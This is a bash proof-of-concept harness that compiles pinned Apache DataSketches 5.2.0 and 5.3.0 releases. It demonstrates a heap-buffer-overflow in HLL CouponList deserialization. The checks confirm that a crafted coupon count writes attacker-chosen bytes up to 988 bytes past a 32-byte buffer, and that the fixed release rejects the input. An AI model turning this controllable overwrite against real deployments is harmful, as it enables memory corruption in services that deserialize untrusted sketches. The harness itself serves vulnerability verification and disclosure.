#!/usr/bin/env bash
# Real-upstream Apache DataSketches HLL CouponList deserialization harness.
# The vulnerable and fixed libraries are the pinned 5.2.0 / 5.3.0 release
# tarballs, compiled verbatim from their own headers. No library source is
# copied or patched. Loopback-free: no socket, server or external probe.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)
cd "$HERE/src" || exit 2
sha256sum -c SHA256SUMS > "$OUT/pins.log" || exit 2
cd "$HERE" || exit 2

rm -rf "$OUT/v52" "$OUT/v53"
mkdir -p "$OUT/v52" "$OUT/v53"
tar -xzf "$HERE/src/5.2.0.tar.gz" -C "$OUT/v52" --strip-components=1 || exit 2
tar -xzf "$HERE/src/5.3.0.tar.gz" -C "$OUT/v53" --strip-components=1 || exit 2
I52="-I$OUT/v52/hll/include -I$OUT/v52/common/include"
I53="-I$OUT/v53/hll/include -I$OUT/v53/common/include"
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
g++ -std=c++11 -O0 -g -fsanitize=address -fno-omit-frame-pointer $I52 "$HERE/driver.cpp" -o "$OUT/v52_asan" || exit 2
g++ -std=c++11 -O0 -g $I52 "$HERE/driver.cpp" -o "$OUT/v52_plain" || exit 2
g++ -std=c++11 -O0 -g -fsanitize=address -fno-omit-frame-pointer $I53 "$HERE/driver.cpp" -o "$OUT/v53_asan" || exit 2

pass=0; fail=0
check() {
  if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
  else echo "FAIL $1"; fail=$((fail+1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }

r1=$($OUT/v52_plain readback 64 90); echo "$r1"
check "rung1 declared LIST count 64 copies 256 bytes into 8-entry buffer" \
  "$(contains 'count=64 value=5a rv=ok' "$r1" && echo 1 || echo 0)"

r2=$($OUT/v52_plain readback 64 90); echo "$r2"
check "rung2 chosen 0x5a at +32/+48/+64/+96/+128/+224/+255" \
  "$(contains '+32=5a +48=5a +64=5a +96=5a +128=5a +224=5a +255=5a' "$r2" && echo 1 || echo 0)"

r3=$($OUT/v52_plain readback 64 165); echo "$r3"
check "chosen 0xa5, not a fixed marker" \
  "$(contains '+32=a5 +48=a5 +64=a5 +96=a5 +128=a5 +224=a5 +255=a5' "$r3" && echo 1 || echo 0)"

r4=$($OUT/v52_plain readback 255 119); echo "$r4"
check "maximum 255 count still copies chosen bytes past the buffer" \
  "$(contains '+32=77 +48=77 +64=77 +96=77 +128=77 +224=77 +255=77' "$r4" && echo 1 || echo 0)"

$OUT/v52_asan asan 64 90 > "$OUT/asan.log" 2>&1
ac=$(cat "$OUT/asan.log")
ok=0
contains 'heap-buffer-overflow' "$ac" &&
contains 'WRITE of size 256' "$ac" &&
contains 'CouponList-internal.hpp:116' "$ac" &&
contains 'HllSketchImplFactory.hpp:101' "$ac" &&
contains 'HllSketch-internal.hpp:63' "$ac" &&
contains '32-byte region' "$ac" && ok=1
check "rung3 ASan WRITE from pinned CouponList-internal.hpp:116 via public deserialize" "$ok"

$OUT/v52_asan asan 255 90 > "$OUT/asan_max.log" 2>&1
am=$(cat "$OUT/asan_max.log")


check "max crafted count writes 1020 bytes (988 past the 32-byte region)" \
  "$(contains 'WRITE of size 1020' "$am" && contains '32-byte region' "$am" && echo 1 || echo 0)"
( $OUT/v52_plain guard 64 90 > "$OUT/guard.log" 2>&1 )
grc=$?
check "guard page faults at the first past-end store" "$([ "$grc" -eq 139 ] && echo 1 || echo 0)"

fc=$($OUT/v53_asan fixed 64 90 2>&1); echo "$fc"
check "fixed 5.3.0 rejects couponCount >= capacity before the copy" \
  "$(contains 'rv=exception what=Attempt to deserialize invalid CouponList with couponCount >= capacity' "$fc" \
     && ! contains 'AddressSanitizer' "$fc" && echo 1 || echo 0)"

fi=$($OUT/v52_asan asan 2 90 2>&1); echo "$fi"
check "vulnerable build accepts a count that fits, ASan clean" \
  "$(contains 'rv=ok' "$fi" && ! contains 'AddressSanitizer' "$fi" && echo 1 || echo 0)"

fb=$($OUT/v53_asan fixed 2 90 2>&1); echo "$fb"
check "fixed build accepts a count that fits, ASan clean" \
  "$(contains 'rv=ok' "$fb" && ! contains 'AddressSanitizer' "$fb" && echo 1 || echo 0)"

group() {
  for i in 1 2 3 4 5; do
    $OUT/v52_plain readback 64 90
    $OUT/v52_plain readback 64 165
    $OUT/v52_plain readback 255 119
    $OUT/v52_plain asan 2 90
    $OUT/v53_plain fixed 64 90
  done | sha256sum | cut -d' ' -f1
}
g++ -std=c++11 -O0 -g $I53 "$HERE/driver.cpp" -o "$OUT/v53_plain" || exit 2
h1=$(group); h2=$(group)
echo "sha256=$h1 sha256_b=$h2 (two independent 5-run groups)"
check "determinism two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
